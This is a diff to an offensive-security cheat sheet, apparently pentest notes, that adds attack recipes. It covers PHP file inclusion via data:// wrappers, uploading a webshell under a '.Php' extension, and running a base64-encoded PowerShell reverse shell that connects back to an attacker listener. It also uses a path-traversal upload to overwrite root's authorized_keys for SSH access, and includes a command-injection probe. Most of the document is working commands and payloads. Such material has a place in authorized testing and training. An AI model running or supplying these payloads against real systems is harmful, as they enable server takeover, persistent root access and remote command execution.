@@ -113,24 +113,51 @@ curl "http://example.com/index.php?page=data://text/plain,<?php%20echo%20system(
 echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 curl "http://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ```
+
 ## File Upload Vulnerability
 
 * Find file uploads in the app (images, texts, doc)
 * Identify programming language
 * Try to upload a webshell `/usr/share/webshells`
 * Identify underlying OS
-* Setup a TCP listener `nc -nlvp 444`
+* Setup a TCP listener `nc -nlvp 4444`
 * Prepare reverse shell e.g. PS `https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3`
 * Use the installed webshell and `powershell -enc` to run a base64 encoded reverse shell exploit
 
 ```powershell
 # Install a PHP webshell
-curl --upload-file /usr/share/webshell/php/simple-backdoor.php http://target.com/meteor/upload.php
+cp /usr/share/webshells/php/simple-backdoor.php ~/simple-backdoor.Php
+curl -i -F "fileToUpload=@./simple-backdoor.Php" http://target.com/meteor/upload.php
+curl -i http://target.com/meteor/uploads/simple-backdoor.Php?cmd=whoami
 # Prepare PS reverse shell
 pwsh
 $Shell = '$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 # Encode utf-8 and convert to base 64 
 $Base64Shell = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Shell))
 # Exploit
-curl http://target.com/meteor/uploads/simple-backdoor.php?cmd=powershell%20-enc%20$Base64Shell
+nc -nlvp 4444
+curl http://target.com/meteor/uploads/simple-backdoor.Php?cmd=powershell%20-enc%20$Base64Shell
 ...
+
+## File Upload with Path Traversal (but no execution)
+
+* A Linux standard vector is to use SSH key for access
+* Combine Path Traversal and File Upload vulnerability
+* Upload `authorized_keys` blindly to `/root/.ssh` folder
+
+```bash
+# Generate new SSH key
+ssh-keygen
+cat new-key.pub > authorized_keys
+# POST authorized_keys via unprotected upload form and exploit path traversal in filename to override the file into root folder
+curl -i -F 'myFile=@./authorized_keys;filename=../../../../../../../../../../root/.ssh/authorized_keys' http://target.com/upload
+ssh -i new-key root@target.com
+```
+
+## Command Inject
+
+Test if we run on 'cmd' or 'powershell'
+
+```shell
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell 
+```
